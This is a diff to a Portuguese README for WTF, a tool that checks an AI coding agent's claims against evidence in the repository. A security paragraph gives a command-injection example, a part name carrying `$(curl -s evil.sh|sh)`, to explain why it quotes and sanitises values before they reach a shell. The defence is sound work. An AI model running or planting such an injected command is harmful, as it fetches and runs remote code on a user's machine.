@@ -27,8 +27,13 @@ guarda cada uma como evento imutável e só promove uma parte de estado quando
 encontra evidência no repositório.
 
 Por isso uma declaração de "terminei" vale como sinal fraco (confiança 0,3) e um
-teste que passou vale como sinal forte (0,9). E por isso `claim.completed`
-sozinho nunca marca nada como testado.
+arquivo que mudou de verdade vale mais. E por isso `claim.completed` sozinho
+nunca marca nada como testado.
+
+Onde o WTF ainda não tem prova, ele diz que não tem: hoje ele **não executa
+teste nenhum**, então o estado que existe é "tem teste escrito", e não
+"testado". Prometer verificação que não houve seria o mesmo defeito que o
+produto existe para combater.
 
 Sem essa separação, o painel viraria a opinião da IA sobre o próprio trabalho —
 que é exatamente aquilo de que o dono do projeto precisa ser protegido.
@@ -108,6 +113,16 @@ IA com o pedido como argumento. Errar essa escolha teria consequência real: um
 pedido colado num shell vazio vira comando executado no seu computador. Na
 dúvida, ele executa — que é o lado seguro.
 
+O texto desse pedido é montado com coisas que **não são nossas**: o nome de uma
+parte vindo do `.wtf/map.json`, nomes de arquivo do Git, o motivo escrito pelo
+modelo. Num app feito para ser apontado a repositórios onde uma IA escreve sem
+supervisão, tratar esse texto como confiável seria um convite: bastaria um
+repositório com uma parte chamada `pagamentos $(curl -s evil.sh|sh)` para que o
+clique em "abrir no sistema" rodasse o `curl` com as suas permissões. Por isso
+todo valor que entra numa linha de comando é citado com aspas simples e passa
+antes por uma limpeza de caracteres de controle — quebra de linha dentro de um
+comando é Enter, e Enter vira comando novo.
+
 ### Idiomas
 
 Interface em português, inglês e espanhol. O idioma em que a **IA escreve** é
@@ -132,6 +147,11 @@ MAPA.md                     →  para que serve cada pasta
 O painel enxerga o **disco**, não só o histórico: quem faz vibe coding passa
 horas sem salvar, e é justamente aí que abre o painel. Trabalho não salvo
 aparece marcado como tal, porque pode ser perdido.
+
+Ao declarar que terminou, a IA anota **quais arquivos mudaram**, resolvidos por
+`git status` naquele instante — é o que liga "a IA disse que fez" a "isto aqui
+mudou". Fica no próprio registro da declaração, sem depender de hook, então
+vale igual para os quatro agentes.
 
 O WTF só **lê** o repositório observado. A única escrita é a instalação, feita
 por clique explícito, com backup de tudo que já existia e desinstalação que
@@ -308,10 +328,15 @@ e não promete nenhum outro.
 
 ## Estado atual
 
-Funciona de ponta a ponta contra repositórios reais, com **456 testes
-automatizados** em 26 arquivos cobrindo os bastidores — a leitura do histórico,
-a varredura de segredos, o instalador, o terminal embutido, as notificações e a
-troca de projetos. Um app que cobra prova precisava ter prova de si mesmo.
+Funciona de ponta a ponta contra repositórios reais, com **479 testes
+automatizados** em 30 arquivos cobrindo os bastidores — a leitura do histórico,
+a varredura de segredos, o instalador, o terminal embutido, as notificações, a
+troca de projetos e a desinstalação. Um app que cobra prova precisava ter prova
+de si mesmo.
+
+Entre eles há um que roda comandos de ataque num `sh` de verdade e confere no
+disco que nada foi executado: é a defesa contra o texto do repositório virar
+comando, e conferir a string montada não bastaria.
 
 As conferências rodam sozinhas no **Windows, no Linux e no macOS** a cada envio,
 e o app é **aberto de verdade** nos três: se a janela não vier, se a tela não
@@ -319,13 +344,17 @@ carregar ou se ela chegar pequena demais para ser vista, o envio é reprovado.
 
 Ainda não existe:
 
+- **Executar os testes do seu projeto** — o WTF vê que existe um arquivo de
+  teste, e é só isso que ele afirma ("tem teste escrito"). Ele não roda o teste,
+  então não sabe se ele passa. O caminho é o hook ler o resultado de um
+  `npm test` e registrar isso como evidência
 - **Registro automático fora do Claude Code** — o hook é a peça que anota o que
   a IA tocou sem depender de ela declarar, e por enquanto só existe ali. Codex,
   Gemini e opencode têm mecanismo equivalente; ainda não foi feito
 - **Vários projetos ao mesmo tempo** — dá para trocar de projeto e o app lembra
   os que você já abriu, mas o acompanhado é um por vez
 - **Instalador** — roda pelo comando `wtf`; não há `.dmg` assinado ainda
-- **Testes da interface** — os 456 cobrem os bastidores. O CI prova que a janela
+- **Testes da interface** — os 479 cobrem os bastidores. O CI prova que a janela
   abre nos três sistemas, não que ela está bonita: layout ainda é verificado a
   olho
 
